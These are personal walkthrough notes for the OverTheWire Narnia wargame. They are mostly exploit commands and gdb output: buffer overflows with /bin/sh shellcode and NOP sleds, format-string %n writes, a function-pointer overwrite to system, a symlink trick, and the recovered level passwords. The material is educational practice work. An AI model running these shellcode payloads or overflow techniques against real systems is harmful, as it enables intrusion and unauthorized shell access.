l 0 
narnia0
narnia0

THANKS www.rootnetsec.com/ FOR ALL LEVELS I COULDNT DO IT WITHOUT THIS BLOG
---------Level 1

echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat;) | ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami 
narnia1
cat /etc/narnia_pass/narnia1

efeidiedae

----------Level 2
https://hackmethod.com/overthewire-narnia-1/?v=9b7d173b068d

Test:
export EGG=ls

watch the memory 0x080484b6, using b *0x080484b6

echo 5f00736c | xxd -r -p  -> '_sl'

now lets hack:
$ uname -a
Linux narnia 4.18.12 #1 SMP Tue Oct 16 11:25:23 UTC 2018 x86_64 GNU/Linux

use this from the tutorial to get the shell \xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81

export EGG=$(python -c 'print"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')

and finally get the password:
nairiepecu

----------Level 3:
shellcode \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80

find eip (EIP is a register in x86 architectures (32bit). It holds the "Extended Instruction Pointer" for the stack. In other words, it tells the computer where to go next to execute the next command and controls the flow of a program. Research Assembly language to get a better understanding of how registers work.)

gdb) x/200wx $esp

--theory
(gdb) x/3 $esp
0xffffd638:	0x00000000	0xf7e2a286	0x00000002
(gdb) x/3x $esp
0xffffd638:	0x00000000	0xf7e2a286	0x00000002
(gdb) x/3w $esp
0xffffd638:	0x00000000	0xf7e2a286	0x00000002
(gdb) x/3b $esp
0xffffd638:	0x00	0x00	0x00

x/s $esp+88 actual string

Also I tried to figure out how the stack works :)

r $(python -c 'print "\x31"*106 + "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x80\xd8\xff\xff"')
WORKS (inside the gdb)

r $(python -c 'print "\x31"*106 + "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x81\xd8\xff\xff"')

DOSENT WORK

why?
we are aiming to the incorrect memory location

(By the way I had to use one \x90 to fill the memory word)
--

we know that our shellcode is 25 bytes long and we know that the variable is 132 bytes long so we need to:

fill with nop instruction+shellcode at the end+ call for the shellcode

r $(python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xd8\xff\xff"')

We use \x90 because is a nop instruction so we only have to choose a memory location into the x\90 and the program will slide into our shellcode (interesting :))

Use shell and get pass:
vaequeezee


----------Level 4:

strcpy vulnerability (overflow to save it in other directories), we cant use the shellcode because we have the exit() part

char ofile[16] = "/dev/null";
char ifile[32];

>>> 32 -len("/tmp/")
>>> 27
>>>print "/tmp/" + 'G' *27
/tmp/GGGGGGGGGGGGGGGGGGGGGGGGGGG

Now we know how to overbuff the ifile in order to modify the ofile and copy the pass into our /tmp/drg

mkdir /tmp/GGGGGGGGGGGGGGGGGGGGGGGGGGG/tmp

cd into

ln -s /etc/narnia_pass/narnia4 ./drg

	
narnia3@narnia:touch /tmp/drg
narnia3@narnia:/tmp/GGGGGGGGGGGGGGGGGGGGGGGGGGG/tmp$ chmod 777 /tmp/drg
narnia3@narnia:/tmp/GGGGGGGGGGGGGGGGGGGGGGGGGGG/tmp$ /narnia/narnia3 /tmp/GGGGGGGGGGGGGGGGGGGGGGGGGGG/tmp/drg
copied contents of /tmp/GGGGGGGGGGGGGGGGGGGGGGGGGGG/tmp/drg to a safer place... (/tmp/drg)
narnia3@narnia:/tmp/GGGGGGGGGGGGGGGGGGGGGGGGGGG/tmp$ cat /tmp/drg
thaenohtai
�(.��P��$������ 


-------------Level 5:
Same as level 3

narnia4@narnia:/narnia$ ./narnia4 $(python -c "print '\x90'*239 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'+'\xd4\xd7\xff\xff'")
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
faimahchiy
	

-------------Level 6:
https://axcheron.github.io/writeups/otw/narnia/

Check the vulnerability:

./narnia5 %x.%x.%x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [f7fc5000.30303035.3330332e] (26)
i = 1 (0xffffd6e0)

Format String Vulnerability

./narnia5 $(python -c 'print "\xe0\xd6\xff\xff" + "%496x%1$n"')

The first part is the allocation of the i variable and the second part the value that we want to introduce
$ cat /etc/narnia_pass/narnia6
neezocaeng


---------------Level 7:
https://www.lukeaddison.co.uk/blog/narnia-level-6/
---
Code:
strcpy(b1,argv[1]); (no limits)
fp(b1);

Overflowing function pointers

0x08048563 <+10>:    movl   $0x80483f0,0x28(%esp)

Running info symbol 0x80483f0 we can see that the address of fp, which points to puts, is then placed 8 bytes away from the saved base pointer
---
go the gdb

b main

r

---
The plan will be to overflow b1 to overwrite the function pointer fp with the address of system. 
Since fp is called with b1 as its argument, this will run system(b1) instead of puts(b1). We can make sure that b1 starts with sh;# which will open our shell. We append # to ensure that any garbage after our sh; command is treated as a comment. We now need to find the address of system. 
---
By running ulimit in the terminal we can see that there is no limit on stack size and hence libc randomisation is disabled, since narnia6 is a 32-bit binary (we can see this in the output of file narnia6). Therefore the address of system is at a deterministic location in memory

find system adress:
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e4c850 <system>
---
From our previous analysis we know that the addresses of b1 and fp are 8 bytes apart. And len("sh;#") = 4
---
narnia6@narnia:/narnia$ ./narnia6 $(python -c "print 'sh;#' + 'A'*4 + '\x50\xc8\xe4\xf7'") A
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
ahkiaziphu


---------------Level 8:
Format String Vulnerability

We overwrite the memory location 0xffffd638 (ptr) changing it from goodfunction location (0x80486ff) to the hackedfunction location (0x8048724)

narnia7@narnia:/narnia$ ./narnia7 $(python -c 'print "\x38\xd6\xff\xff%134514468x%n%"')
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd648)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whoami
narnia8
$ cat /etc/narnia_pass/narnia8
mohthuphog

---------------Level 9:
https://infamoussyn.wordpress.com/2014/04/08/overthewire-narnia-level-5-9-writeup/#level9

(gdb) r $(python -c'print "\x41"*20')
Starting program: /games/narnia/narnia8 $(python -c'print "\x41"*20')

(watch how memory is working)
 
r $(python -c'print("\x41"*20 + "\x7a\xd8\xff\xff" + "\x42"*8)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c'print("\x41"*20 + "\x7a\xd8\xff\xff" + "\x42"*8)')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/160wx $esp
0xffffd66c:	0x08048550	0xffffd674	0x41414141	0x41414141
0xffffd67c:	0x41414141	0x41414141	0x41414141	0xffffd87a <- blah
0xffffd68c:	0x42424242	0x42424242	0xffffd87a <-	0x00000000 - RET
0xffffd69c:	0xf7e2a286	     |		0xffffd734
				     |
		place where we are going to place the memory of our shellcode
		
		
Due we can't enter our shellcode in the input we are going to use a envir variable and find the location in memory

export SC=$(python -c'print("\x90"*30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')

r $(python -c'print("\x41"*20 + "\x7a\xd8\xff\xff" + "\x41"*4 + "\x5c\xdf\xff\xff")')

x/3000wx $esp

(find aprox location to get it into the \x90 part of our shellcode)

(we cant acess from the gdb because of permissions so we are going to enter from the normal way pipeing with xxd)

./narnia8 $(python -c'print("\x41"*20 + "\x3f\xd8\xff\xff" + "\x41"*4 + "\x5c\xdf\xff\xff")') | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 3f2f ffff 98d6 ffff a784 0408  AAAA?/..........
00000020: 5dd8 ffff 0a   
		|
		pointer to blah

./narnia8 $(python -c'print("\x41"*20 + "\x5d\xd8\xff\xff" + "\x41"*4 + "\x5c\xdf\xff\xff")')
AAAAAAAAAAAAAAAAAAAA]���AAAA\���]���
$ whoami
narnia9
$ cat /etc/narnia_pass/narnia9
eiL5fealae












FAIL ATTEMPT, DO NOT REPEAT :)


https://cplusperks.com/narnia/#level8

(gdb) set disassembly-flavor intel
(gdb) disas func

follow guide

address of b [arg] 		= ebp+0x8
pointer to blah			= ebp-0x4
start of the buffer (bok)	= ebp-0x18

We can overflow the buffer in order to modify *blah into the variable b
----Search for the memory address of b

$(python -c "print 'A'*20 + '\xd7\xf6\xff\xff' + 'A'*140")
AAAAAAAAAAAAAAAAAAAA�a����������

Breakpoint 1, 0x0804848e in func ()
(gdb) x/wx $ebp+0x8
0xffffd614:	0xffffd7f6
(gdb) r $(python -c "print 'A'*20 + '\xf6\xd7\xff\xff' + 'A'*140")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c "print 'A'*20 + '\xf6\xd7\xff\xff' + 'A'*140")
AAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����0p������� ���

B IS IN \xf6\xd7\xff\xff

-----Find the return address for the overflow (you have to change the first part everytime)CHECK_

$(python -c "print 'A'*20 + '\x72\xd8\xff\xff' + 'A'*12 + '\xef\xbe\xad\xde'")
AAAAAAAAAAAAAAAAAAAAr���AAAAAAAAAAAAﾭކ���

x/wx $ebp+0xc
0xffffd698:	0xdeadbeef
------------------------------------------------
$(python -c 'print "A"*20 + "\x93\xdf\xff\xff" + "A"*4 +"\xef\xbe\xad\xde"')

Breakpoint 2, 0x08048485 in func ()
(gdb) x/24wx $esp
0xffffdddc:	0x08048550	0xffffdde4	0x41414141	0x41414141
0xffffddec:	0x41414141	0x41414141	0x41414141	0xffffdf93
0xffffddfc:	0x41414141	0xdeadbeef	0xffffdf93	0x00000000
0xffffde0c:	0xf7e2a286	0x00000002	0xffffdea4	0xffffdeb0
0xffffde1c:	0x00000000	0x00000000	0x00000000	0xf7fc5000
0xffffde2c:	0xf7ffdc0c	0xf7ffd000	0x00000000	0x00000002
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAA����AAAAﾭޓ���

Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()

-------------------------------------------------

notes:

0x08048485 <+106>:	call   0x80482e0 <printf@plt>

x/24wx $esp
0xffffdddc:	0x08048550	0xffffdde4	0x41414141	0x41414141
0xffffddec:	0x41414141	0x41414141	0x41414141	0xffffdf9f

ffff df9f - ffff 


recuerda:
el offset son con 4 'A''s o eso parece
